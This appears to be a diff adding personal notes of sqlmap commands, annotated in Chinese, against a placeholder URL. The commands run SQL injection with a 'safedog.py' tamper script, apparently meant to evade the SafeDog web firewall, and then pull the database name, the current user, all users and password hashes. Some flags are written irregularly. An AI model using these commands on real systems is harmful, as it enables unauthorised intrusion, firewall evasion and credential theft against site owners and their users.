@@ -1,0 +1,7 @@
+sudo sqlmap -u "http:\\ip\目录\?id=2" --technique=E --tamper=safedog.py
+
+sudo sqlmap -u "http:\\ip\目录\?id=2" --technique=E --tamper=safedog.py --current-db(查看数据库名称)
+                                                                                           user(查看当前数据库用户)
+                                                                                 --users(查看所有用户）
+                                                                                 --password(查看用户密码)
+    
